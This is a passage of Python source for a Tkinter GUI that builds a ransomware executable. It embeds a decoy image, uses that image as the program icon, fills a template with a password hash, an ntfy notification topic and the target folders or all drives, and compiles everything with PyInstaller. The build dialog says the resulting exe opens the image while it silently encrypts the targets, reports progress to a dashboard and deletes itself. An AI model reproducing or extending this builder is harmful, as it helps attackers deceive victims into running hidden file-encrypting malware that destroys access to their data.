            "🎨 Adobe Suite" : {".psd",".ai",".indd",".indb",".eps",".prproj",
                                 ".aep",".aet",".xd",".lrcat",".lrdata",".dng",
                                 ".psb",".ase",".asl",".abr",".act",".aco"},
            "📐 3D / CAD"    : {".dwg",".dxf",".skp",".blend",".fbx",".obj",
                                 ".stl",".max",".c4d",".mb",".ma",".3ds",".dae",
                                 ".igs",".iges",".stp",".step",".f3d",".ipt"},
            "💻 Dev Files"   : {".java",".class",".jar",".cs",".cpp",".c",".h",
                                 ".php",".rb",".go",".rs",".swift",".kt",".ts",
                                 ".jsx",".vue",".env",".pem",".key",".crt",".cer",
                                 ".p12",".pfx",".yml",".yaml",".toml",".lock",
                                 ".gradle",".dart",".lua",".r",".m",".scala"},
            "📧 Email Files" : {".pst",".ost",".eml",".msg",".emlx",".mbox"},
        }

        # Add extensions to skip list for unchecked categories
        for cat, exts in cat_exts.items():
            if cat in self.cat_vars and not self.cat_vars[cat].get():
                skip_ext |= exts

        # System dirs
        base_skip_dirs = {
            "$recycle.bin","system volume information","boot",
            "recovery","perflogs","__pycache__",".git","msocache",
            "intel","amd","nvidia","drivers"
        }
        if not self.include_sys_folders.get():
            base_skip_dirs |= {
                "windows","program files","program files (x86)",
                "programdata","appdata"
            }

        return base_skip_dirs, skip_ext

    def _add_folder(self):
        try:
            path = filedialog.askdirectory(title="Select folder to encrypt")
            if path:
                path = path.replace("/", "\\")
                if path not in self.paths_listbox.get(0, "end"):
                    self.paths_listbox.insert("end", path)
        except KeyboardInterrupt:
            pass

    def _add_all_drives(self):
        """Auto-detect all available drives and add them."""
        import string as _str, ctypes as _ct
        added = 0
        for letter in _str.ascii_uppercase:
            drive = f"{letter}:\\"
            if os.path.exists(drive):
                try:
                    dtype = _ct.windll.kernel32.GetDriveTypeW(drive)
                    if dtype in (2, 3, 4, 6):
                        if drive not in self.paths_listbox.get(0, "end"):
                            self.paths_listbox.insert("end", drive)
                            added += 1
                except Exception:
                    pass
        if added == 0:
            messagebox.showinfo("Drives", "No new drives found to add.")

    def _remove_path(self):
        sel = self.paths_listbox.curselection()
        if sel:
            self.paths_listbox.delete(sel[0])

    def _get_target_paths(self):
        """Return list of all target paths."""
        return list(self.paths_listbox.get(0, "end"))

    def _browse_folder(self, var):
        try:
            path = filedialog.askdirectory()
            if path:
                var.set(path)
        except KeyboardInterrupt:
            pass

    def _browse_image(self):
        try:
            path = filedialog.askopenfilename(
                title="Select decoy image",
                filetypes=[("Image files", "*.jpg *.jpeg *.png *.bmp *.gif"),
                           ("All files", "*.*")]
            )
            if path:
                self.image_path.set(path)
                name = os.path.basename(path)
                self.img_label.config(text=f"✅  {name}", fg=ACCENT)
        except KeyboardInterrupt:
            pass

    def _log(self, msg):
        self.log_text.config(state="normal")
        self.log_text.insert("end", msg + "\n")
        self.log_text.see("end")
        self.log_text.config(state="disabled")
        self.root.update_idletasks()

    def _clear_log(self):
        self.log_text.config(state="normal")
        self.log_text.delete("1.0", "end")
        self.log_text.config(state="disabled")

    def _start_build(self):
        # Validate
        paths = self._get_target_paths()
        if not paths:
            messagebox.showerror("Error", "Please add at least one target folder or drive."); return
        invalid = [p for p in paths if not os.path.exists(p)]
        if invalid:
            messagebox.showerror("Error", f"Path not found:\n{invalid[0]}"); return
        py_exe = self.python_path.get().strip()
        if not py_exe or not os.path.exists(py_exe):
            messagebox.showerror("Python Not Found",
                "Could not find Python executable.\n\n"
                "Please click Browse next to 'Python path' and select your python.exe\n\n"
                "Usually at:\n"
                r"C:\Users\MAD\Desktop\FileGuardian\.venv\Scripts\python.exe")
            return
        if not self.image_path.get() or not os.path.exists(self.image_path.get()):
            messagebox.showerror("Error", "Please select a valid image file."); return
        if not self.password_var.get():
            messagebox.showerror("Error", "Please enter a password."); return
        if not self.exe_name.get():
            messagebox.showerror("Error", "Please enter an output .exe name."); return

        self.build_btn.config(state="disabled", text="⏳  Building...", bg=MUTED)
        self._clear_log()
        threading.Thread(target=self._build, daemon=True).start()

    def _build(self):
        try:
            self._log("🚀 Starting build...")
            img_path    = self.image_path.get()
            paths_list  = self._get_target_paths()
            # Format as Python list string for template
            target      = repr(paths_list)
            password    = self.password_var.get()
            pw_hash     = hashlib.sha256(password.encode()).hexdigest()
            exe_name    = self.exe_name.get()
            ntfy_topic  = self.ntfy_topic.get()
            output_dir  = self.output_dir.get()
            work_dir    = tempfile.mkdtemp(prefix="guardian_build_")

            # Step 1: Convert image to base64
            self._log("📸 Embedding decoy image...")
            with open(img_path, "rb") as f:
                img_b64 = base64.b64encode(f.read()).decode()

            # Step 2: Convert image to ICO
            self._log("🎨 Creating icon from image...")
            ico_path = os.path.join(work_dir, "icon.ico")
            img = Image.open(img_path).convert("RGBA")
            sizes = [256, 128, 64, 48, 32, 16]
            images = [img.resize((s, s), Image.LANCZOS) for s in sizes]
            images[0].save(ico_path, format="ICO",
                           sizes=[(s, s) for s in sizes],
                           append_images=images[1:])
            self._log(f"   ✅ Icon created ({os.path.getsize(ico_path):,} bytes)")

            # Step 3: Generate file_guardian.py with all settings
            self._log("⚙️  Generating file_guardian.py with your settings...")
            skip_dirs, skip_exts = self._build_skip_lists()
            self._log(f"   Encrypting: {len(skip_exts)} extension types skipped")
            self._log(f"   System folders: {'included' if self.include_sys_folders.get() else 'excluded'}")
            py_code = TEMPLATE
            py_code = py_code.replace("{{DECOY_B64}}", img_b64)
            py_code = py_code.replace("{{PASSWORD_HASH}}", pw_hash)
            py_code = py_code.replace("{{NTFY_TOPIC}}", ntfy_topic)
            py_code = py_code.replace("{{TARGET_PATH}}", target)
            py_code = py_code.replace("{{SKIP_DIRS}}", repr(skip_dirs))
            py_code = py_code.replace("{{SKIP_EXTENSIONS}}", repr(skip_exts))
            py_path = os.path.join(work_dir, "file_guardian.py")
            with open(py_path, "w", encoding="utf-8") as f:
                f.write(py_code)
            self._log("   ✅ file_guardian.py generated")

            # Step 4: Auto-install PyInstaller if missing
            self._log("🔍 Checking PyInstaller...")
            py_exe = self.python_path.get().strip()
            self._log(f"🐍 Using Python: {py_exe}")
            chk = subprocess.run(
                [py_exe, "-m", "PyInstaller", "--version"],
                capture_output=True, text=True
            )
            if chk.returncode != 0:
                self._log("📦 PyInstaller not found — installing now...")
                inst = subprocess.run(
                    [py_exe, "-m", "pip", "install", "pyinstaller"],
                    capture_output=True, text=True
                )
                if inst.returncode != 0:
                    self._log("❌ Failed to install PyInstaller:")
                    self._log(inst.stderr[-800:])
                    self._done(success=False); return
                self._log("   ✅ PyInstaller installed")
            else:
                self._log(f"   ✅ PyInstaller {chk.stdout.strip()} found")

            # Step 4.5: Validate generated Python file syntax
            self._log("🔍 Validating generated script...")
            import ast as _ast
            try:
                with open(py_path, encoding="utf-8") as _f: _src = _f.read()
                _ast.parse(_src)
                self._log("   ✅ Script syntax OK")
            except SyntaxError as se:
                self._log(f"❌ Syntax error in generated script: {se}")
                self._log(f"   Line {se.lineno}: {se.text}")
                self._done(success=False); return

            # Step 5: Run PyInstaller
            self._log("🔨 Running PyInstaller (this takes 1-2 minutes)...")
            cmd = [
                py_exe, "-m", "PyInstaller",
                "--onefile", "--windowed",
                f"--icon={ico_path}",
                f"--name={exe_name}",
                "--distpath", output_dir,
                "--workpath", os.path.join(work_dir, "build"),
                "--specpath", work_dir,
                "--clean",
                py_path
            ]
            result = subprocess.run(cmd, capture_output=True, text=True, cwd=work_dir)
            # Show last part of output regardless of success
            out_combined = (result.stdout + result.stderr).strip()
            if out_combined:
                self._log("--- PyInstaller output ---")
                self._log(out_combined[-1200:])
                self._log("--------------------------")
            if result.returncode != 0:
                self._log("❌ PyInstaller failed (see output above)")
                self._done(success=False)
                return

            # Step 5: Verify output
            out_exe = os.path.join(output_dir, exe_name)
            if not os.path.exists(out_exe):
                # Try with .exe extension
                out_exe = os.path.join(output_dir, exe_name + ".exe")
            if os.path.exists(out_exe):
                size_mb = os.path.getsize(out_exe) / (1024 * 1024)
                self._log(f"✅ BUILD COMPLETE!")
                self._log(f"📦 Output: {out_exe}")
                self._log(f"📏 Size: {size_mb:.1f} MB")
                self._log(f"🎭 Disguised as: {exe_name}")
                self._log(f"📁 Encrypts: {self.target_path.get()}")
                self._log(f"🔒 Password hash: {pw_hash[:16]}...")
                self._done(success=True, out_path=out_exe)
            else:
                self._log("❌ Output exe not found. Check PyInstaller logs.")
                self._done(success=False)

            # Cleanup temp
            try: shutil.rmtree(work_dir)
            except Exception: pass

        except Exception as e:
            self._log(f"❌ Build failed: {e}")
            self._done(success=False)

    def _done(self, success, out_path="", error_msg=""):
        if success:
            self.build_btn.config(state="normal",
                                   text="🔨   BUILD  FILE GUARDIAN .EXE",
                                   bg=ACCENT)
            messagebox.showinfo("✅  Build Complete!",
                f"Your disguised .exe is ready!\n\n{out_path}\n\n"
                "Double-click it to test — it will:\n"
                "1. Open your image in Windows Photos\n"
                "2. Silently encrypt the target folder\n"
                "3. Push live progress to your dashboard\n"
                "4. Delete itself after completion")
        else:
            self.build_btn.config(state="normal",
                                   text="🔨   BUILD  FILE GUARDIAN .EXE",
                                   bg=DANGER)
            # Get last lines from log
            self.log_text.config(state="normal")
            log_content = self.log_text.get("1.0", "end").strip()
            self.log_text.config(state="disabled")
            last_lines = "\n".join(log_content.split("\n")[-8:])
            messagebox.showerror("Build Failed — Error Details",
                f"Build failed. Last log output:\n\n{last_lines}")


if __name__ == "__main__":
    # Check Pillow
    try:
        from PIL import Image
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pillow"])
    root = tk.Tk()
    GuardianBuilder(root)
    try:
        root.mainloop()
    except KeyboardInterrupt:
        pass
